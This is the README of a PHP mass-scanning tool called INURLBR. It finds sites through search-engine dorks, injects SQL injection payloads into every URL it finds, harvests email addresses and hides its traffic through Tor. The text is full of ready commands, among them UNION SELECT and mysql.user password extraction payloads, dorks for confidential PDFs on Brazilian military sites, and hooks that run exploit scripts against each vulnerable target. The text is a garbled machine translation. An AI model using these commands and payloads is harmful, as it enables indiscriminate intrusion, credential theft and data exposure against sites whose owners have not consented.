SCANNER - INURLBR 
=============== 

> Advanced search in the search engines, since Enables analysis to exploit GET / POST to capture emails & amp; internal custom validation for each target / url found. 

> 
  * GROUP GOOGLEINURL BRAZIL - ADVANCED SEARCH. 
  * SCRIPT NAME: INURLBR 
  * AUTHOR: Cleiton Pinheiro 
  * Nick: Googleinurl 
  * Blog: http://www.fb.com/soufian.ckin2u
  * Twitter: / @sows_scream
  * Facebook: / soufian.ckin2u
  * Version: 1.0.1 
  * Php5-curl LIB 
  * Php5-cli LIB 
  * CURL support enabled 
  * CURL Information 7.24.0 
  * Allow_url_fopen On 
  * Reading & Writing permission 
  * User root privilege, or is in the sudoers group 
  * Operating system LINUX 
  * Proxy random TOR 
  * ------------------------------------------------- --------- 
  * [+] PERMISSION EXECUTION: chmod + x inurlbr.php 
  * [+] INSTALLING LIB CURL: sudo apt-get install php5-curl 
  Php5-cli sudo apt-get install: * [+] INSTALLING LIB CLI 
  * [+] INSTALLING TOR PROXY https://www.torproject.org/docs/debian.html.en 
  * ------------------------------------------------- --------- 

  * [+] SIMPLE COMMANDS 
  * ./inurlbr.php --dork 'Inurl: php? Id =' save.txt -q -s 1.6 -t 1 --exploit-get '?' 0x27 "

  * ./inurlbr.php --dork 'Inurl: aspx? Id =' save.txt -q -s 1.6 -t 1 --exploit-get "''0x27?" 

  * ./inurlbr.php --dork 'Site: br inurl: aspx (id | new)' 1.6 -q -s -t 1 save.txt --exploit-get "''0x27?" 

  * ./inurlbr.php --dork 'Index of wp-content / uploads' -s -t save.txt -q 2 --exploit 1,6,2,4-get '?' -a 'Index of / wp-content / uploads' 

  * ./inurlbr.php --dork 'Site: .mil.br intext: (confidential) ext: pdf' -s -t 2 save.txt -q 1.6 --exploit-get '?' -a 'confidential' 

  * ./inurlbr.php --dork 'Site: .mil.br intext: (secret) ext: pdf' -s -t 2 save.txt -q 1.6 --exploit-get '?' -a 'secret' 

  * ./inurlbr.php --dork 'Site: br inurl: aspx (id | new)' 1.6 -q -s -t 1 save.txt --exploit-get "''0x27?" 

  * ./inurlbr.php --dork '.new.php? Id new' -s save.txt -q -t 1 --exploit 1,6,7,2,3-get "+ + UNION ALL + SELECT + 1, concat (0x3A3A4558504C4F49542D5355434553533A3A,@@version), 3,4,5; "-a 'EXPLOIT-SUCESS :: ::' 


  * Options available: 

- Help / Help: 
------ 
`` `
--help ./inurlbr.php 
./inurlbr.php --help 
./inurlbr.php -h 
`` `
- Options: 
------ 
`` `
  _ _ _ ______ _____ 
| | | | ____ | | | __ \ 
| | __ | | | __ | | | | __) | 
| __ | __ | | | | ___ / 
| | | | | ____ | | ____ | | 
| _ | | _ | ______ | ______ | _ | 
---------------------------------------------------------------------------------------------------------------------------------- 
-h 
Alternative long length --help help command. 
I specify --help Command to Help. 
Information --info script. 
  -q Choose Which search engine you want through [1 ... 13]: 
      [options]: 
      1 - www.google.com.br 
      2 - www.bing.com 
      3 - br.search.yahoo.com 
      4 - www.ask.com 
      5 - search.hao123.com.br 
      6 - ajax.googleapis.com 
      7 - search.lycos.com 
      8 - busca.uol.com.br 
      9 - us.yhs4.search.yahoo.com 
      10 - pesquisa.sapo.pt 
      11 - www.dmoz.org 
      12 - www.gigablast.com 
      13 - web.search.naver.com 
      all - All search engines 
      Default: 1 
      Example: -q {op} 
      Usage: -q 1 
               -q 5 
                Using more than one engine: -q 1,2,5,6,11 
                Using all engines: -q all 
     
  -p Choose Which proxy you want to use through the search engine: 
      Example: {-p proxy: port} 
      Usage: -p ​​localhost: 8118 
               -p socks5: // googleinurl @ localhost: 9050 
               -p http: // admin: 12334@172.16.0.90: 8080 
   
--tor Enables the TOR-random function, each unique usage an IP links. 
 
  Select the type validation -t: op 1, 2, 3 
      [options]: 
      1 - The first type uses default errors Considering the script: 
      It establishes connection with the exploit through the get method. 
      Demo: www.alvo.com.br/pasta/index.php?id={exploit} 
   
      2 - The second type tries to valid the error defined by: = -a 'ALGO_DENTRO_ALVO' 
      Also it establishes connection with the exploit through the get method 
      Demo: www.alvo.com.br/pasta/index.php?id={exploit} 
   
      3 - The third type combines Both first and second types: 
      Then, of course, Also it establishes connection with the exploit through the get method 
      Demo: www.alvo.com.br {exploit} 
      Default: 1 
      Example: -t {op} 
      Usage: -t 1 
     
      DEFAULT ERRORS: 
      CMS WORDPRESS, JDBC ERROR MYSQL ERROR, ERROR MICROSOFT, ORACLE ERROR, ERROR POSTGRESQL, 
      ZEND FRAMEWORK ERROR, ERROR PHP, ASP ERROR, LUA ERROR, ERROR INDEFINITE 
   
  Which dork --dork Defines the search engine will use. 
      Example: --dork dork {} 
      Usage: --dork 'site: .gov.br inurl: php? id '
      - Using multiples dorks: 
      Example: --dork {[DORK] dork1 [DORK] dork2 [DORK] dork3} 
      Usage: --dork '[DORK] site: br [DORK] site: air inurl: php [DORK] site: il inurl: asp' 
 
  --exploit-get Defines Which exploit will be injected through the GET method to each URL found. 
      Example: --exploit-get} {exploit_get 
      Usage: --exploit-get ''0x27;?' 
     
  --exploit post Defines Which exploit will be injected through the POST method to each URL found. 
      Example: --exploit-post} {exploit_post 
      Usage: --exploit-post '? Field1 = value1 & field2 = value2 & field3 = '0x273exploit; & button = ok' 
     
  --exploit-comand Defines Which exploit / parameter will be executed in the options: --comand-vul / - comand-all. 
      The exploit-comand will be Identified by the paramaters: --comand-vul / - as-all comand _EXPLOIT_ 
      Ex---exploit comand '/admin/config.conf' --comand-all 'curl -v _TARGET__EXPLOIT_' 
      _TARGET_ Is the specified URL / TARGET Obtained by the process 
      _EXPLOIT_ Is the exploit / parameter defined by the option --exploit-comand. 
      Example: --exploit-exploit-comand comand {} 
      Usage: --exploit-comand '/admin/config.conf' 
     
  -a Specify the string que will be used on the search script: 
      Example: string {-a} 
      Usage: -a '<title> Hello World </ title>' 
     
  Specify the script usage d p 1, 2, 3, 4, 5, 6. 
      Example: -d {op} 
      Usage: -d 1 / URL of the search engine. 
               -d 2 / Show all the url. 
               -d 3 / Detailed request of every URL. 
               -d 4 / Shows the HTML of every URL. 
               -d 5 / Detailed request of all URLs. 
             
  -s Specify the output file where it will be saved the vulnerable URLs. 
     
      Example: -s {file} 
      Usage: -s your_file.txt 
     
  -o vulnerable Manually manage the URLs you want to use from the file, without using a search engine. 
      Example: -o ​​{} file_where_my_urls_are 
      Usage: -o ​​tests.txt 
 
  -m Enable the search for emails on the specified urls. 
       
  -u Enables the search for URL lists on the url specified. 
 
  --gc Enable validation of values ​​with google webcache. 
 
  --cms-check Enable simple check if the url / target is using CMS 


  --comand-vul Every vulnerable URL found will execute this command parameters. 
      Example: --comand-vul {command} 
      Usage: --comand-vul 'nmap -p 22,80,21 _TARGET_ sV' 
               --comand-vul './exploit.sh _TARGET_ output.txt' 
             
  --comand-all Use this commmand to I specify a single command to EVERY URL found. 
      Example: --comand-all {} command 
      Usage: --comand-all 'nmap -p 22,80,21 _TARGET_ sV' 
               --comand-all './exploit.sh _TARGET_ output.txt' 
             
     Observation: 
   
     _TARGET_ Will Be Replaced by the URL / target found, although if the user 
     does not get the input, only the domain will be executed. 
   
    _TARGETFULL_ Will Be Replaced by the original URL / target found. 
   
    _EXPLOIT_ Will Be Replaced by the specified command argument --exploit-comand. 
    The exploit-comand will be Identified by the --comand-vul / parameters --comand-all the _EXPLOIT_ 

  --replace Replace values ​​in the target URL. 
     Example: {value_old --replace [INURL] value_new} 
      Usage: 'index.php? Id = [INURL] index.php id = 1666 + and + (+ SELECT user, password from + + + mysql.user limit + 0.1) = 1?' --replace 
               --replace 'main.php? id = [INURL] main.php? id = 1 + and + substring (@@version, 1,1) = 1' 
               --replace 'index.aspx? id = [INURL] index.aspx? id = 1% 27'' 
`` `

- Giving permission to run the script: 
------ 
`` `
$ chmod + x inurlbr.php 
Run: ./inurlbr.php 
`` `

- Making simple search: 
------ 
   * Command --dork sua_dork {} 
   * Command {-s} results.txt 
   * Command---exploit get {exploit} 
   * Command motor_de_busca -q {} 
`` `
./inurlbr.php --dork "site: br news php id =" "? '0x27" results.txt --exploit-get -q -s all 
`` `
- Performing research with multiple dorks: 
------ 
   * Command / simple --dork sua_dork {} 
   * Command / multiple --dork {[DORK] sua_dork1 [DORK] sua_dork2 [DORK] sua_dork3} 
`` `
./inurlbr.php --dork "[dork] site: us news php id = [dork] site: php? id = news air [dork] website:? gov.br news php id =" -s results.txt --exploit-get '?' 0x27 "-q all 
`` `
- Performing research with one or more search engines: 
------ 
   * Command motor_de_busca -q {} 
`` `
./inurlbr.php --dork "site: br news php id =" -s results.txt --exploit-get '?' 0x27 "-q {OPTION} 
./inurlbr.php --dork "site: us news php? id =" -s results.txt --exploit-get -q 5 "'0x27?" 
./inurlbr.php --dork "site: us news php? id =" results.txt --exploit-get -q -s 1,2,3,4 "'0x27?" 
./inurlbr.php --dork "site: us news php? id =" -s results.txt --exploit-get -q 12,11,7,1 '' 0x27? "

`` `
- Setting sort of error to be validated: 
------ 
   * -t Command {op} 
   * TYPE [1] Validates standard errors of the script concatenates exploit injects & starting & host gets. 
`` `
Demo: www.alvo.com.br/pasta/index.php?id={exploit} 
Demo: www.alvo.com.br/pasta/pasta2/list.php?menu=1&id={exploit} 
`` `
    Search inside the url values ​​/ standards set internally errors in the script. 
`` `
./inurlbr.php --dork "site: br news php id =" "? '0x27" results.txt --exploit-get -q -s -t 1 all 
`` `
   * TYPE [2] Validates the error defined in -a = 'ALGO_DENTRO_ALVO' concatenates exploit injects & starting & host gets. 
`` `
Demo: www.alvo.com.br/pasta/index.php?id={exploit} 
`` `
    Search inside the url values ​​/ standard errors defined in -a 'ALGO_DENTRO_ALVO' 
    Ex: I find the word "Marighella" urls found within -a 'Marighella'. 
`` `
./inurlbr.php --dork "site: br news php id =" "? results.txt --exploit-get -s' 0x27" -q -a all -t 2 'Marighella' 
`` `
   * TYPE [3] Validates error defined in -a = 'ALGO_DENTRO_ALVO' & standard script errors. 
     concatenate & exploit injects starting host. 
`` `
Demo: www.alvo.com.br {exploit} 
`` `
   > Looking inside the url values ​​/ standards + error value -a 'ALGO_DENTRO_ALVO' 
    Ex: I find the word "Marighella" urls found within -a 'Marighella'. 
    If I have an exploit that by running the url an error / value, so the script is generated by demand 
    value 'Marighella' if found url / target is considered to be vulnerable. 
`` `
Ex: Exploit = '/index.php?id=1+select+UNHEX(HEX(CONCAT_WS(0x3a,0x3A3A3A494E55524C3A3A3A)))+from+users
`` `
    > Value: 0x3A3A3A494E55524C3A3A3A is the string ':::: :: INURL' converted to hexadecimal. 
    URL / TARGET script found at: 
`` `
www.alvo.com.br/valores/casas.php?abrir=1 
`` `
    The script will filter returning only the host url + exploit, thus running. 
`` `
www.alvo.com.br/index.php?id=1+select+UNHEX(HEX(CONCAT_WS(0x3a,0x3A3A3A494E55524C3A3A3A)))+from+users
`` `
    > How do we know that was successfully exploited? 
    Setting the value -a ':::: :: INURL' if this value appears in the url is likely to run vulnerability. 
ex: 
`` `
./inurlbr.php --dork "site: br news php id =" -s results.txt 
--exploit-get "/index.php?id=1+select+UNHEX(HEX(CONCAT_WS(0x3a,0x3A3A3A494E55524C3A3A3A)))+from+users"
all -q -t 3 -a ':::: :: INURL' 
`` `
   
If you want to look for websites that use CMS 'Joomla! 1.5 ': 
ex: 
`` `
./inurlbr.php --dork 'site: br "!? How do I install Joomla! 1.5' '-s results.txt all -q -t 3 -a' Joomla! 1.5 '
`` `
- Defining exploit GET / POST. 
----- 
   * Command---exploit get {exploit} 
   * Sets exploit --exploit-get via get will be injected every URL found. 
`` `
Example: --exploit-get} {exploit_get 
Usage: --exploit-get ''0x27;?' 
          Demo: www.alvo.com.br/pasta/index.php?id={exploit-get} 
          Demo: www.alvo.com.br/pasta/pasta2/list.php?menu=1&id={exploit-get} 
`` `
   * Command --exploit-post {exploit} 
   * Sets --exploit post-exploit via post will be injected every URL found. 

`` `
Example: --exploit-post} {exploit_post 
Usage: --exploit-post '? Field1 = value1 & field2 = value2 & field3 = '0x273exploit; & button = ok' 
          Demo: www.alvo.com.br/pasta/index.php VIA POST-post} {exploit 
          Demo: www.alvo.com.br/pasta/pasta2/list.php VIA POST-post} {exploit 
`` `
- Setting custom value that must be sought within each URL / AIM: 
----- 
   * Command {-a} lookup_value 
   * Sets -a string that will be searched within each URL found. 
`` `
Example: {-a} string_procurada 
Usage: -a '<title> Hello dorkeiro </ title>' 
          Demo: -a 'Joomla! 1.5 '
          Demo: -a 'Hall -' 
          Demo: -a 'maria' 
          Demo: -a '23423423423523' 
`` `
- Defining file that will be our base URL's without the requirement to search engines: 
----- 
   * Command {-a} arquivo_urls.txt 
   * -o Defines file that will allow execucação testing based on file. 
`` `
No search engine. 
Example: -o {} arquivo_minhas_urls 
Usage: -o ​​testes.txt 
demonstrative formatted file: 
          www.alvo1.com.br/pasta2/pasta2/list2.php?menu=1&id=423423 
          www.alvo2.com.br/pasta/list.php?menu3=1&id=23 
          www.alvo3.com.br/pasta2/list.php?menu=1&id=2345 
          www.alvo4.com.br/pasta/pasta2/list2.php?menu=1&id=3 
          www.alvo7.com.br/pasta/pasta2/list.php?menu=1&id=2 
          www.alvo0.com.br/arquivo/pasta2/index.php?menu_id=1&id=1 
`` `
    > These urls will caregadas the scripts according to the parameters passed tests. 
   
  - Defining search for emails: 
----- 
   * -m Command 
   * Enables -m get list of emails within encontrdas urls. 
`` `
/inurlbr.php --dork 'mailgmail ext: txt' -s -m all -q results.txt 
`` `
  - Defining proxy / tor: 
----- 
   * -p Command {proxy} 
   * Sets -p proxy for camouflage sending request to the search engine and to exploit target. 
`` `
Example: {Proxy p} 
Use: -p localhost: 8118 
          -p socks5: // googleinurl @ localhost: 9050 
          -p http: // admin: 12334@172.16.0.90: 8080 
`` `
  - Setting proxy-random: 
----- 
   * Command-random --tor 
   * --tor Random-random function enables tor, every script execution tor change ip. 

> 
This command is only executed if you have completed the -p {proxy}. 
For that function has operation should install tor aplivativo. 
Each new run of the script in your ip TOR network will be renewed. 
Help: 
- https://www.torproject.org/docs/debian.html.en 
- http://www.privoxy.org/ 

  - Defining external command: 
----- 
   * Command-vul --comand comando_terminal {} 
   * --comand-Vul Executes commands in the terminal for each URL found vulnerable. 
`` `
     Example: --comand-vul {command} 
     Usage: --comand-vul 'nmap -p 22,80,21 _TARGET_ sV' 
              --comand-vul './exploit.sh _TARGET_ output.txt' 
              --comand-vul '-c 1 pint _TARGET_ >> output.txt' 
`` `
   * Command --comand-all {} comando_terminal 
   * --comand-All Performs commands in terminal for all URLS found. 
`` `
     Example: --comand-all {} command 
     Usage: --comand-all 'nmap -p 22,80,21 _TARGET_ sV' 
              --comand-all './exploit.sh _TARGET_ output.txt' 
              --comand-vul '-c 1 pint _TARGET_ >> output.txt' 
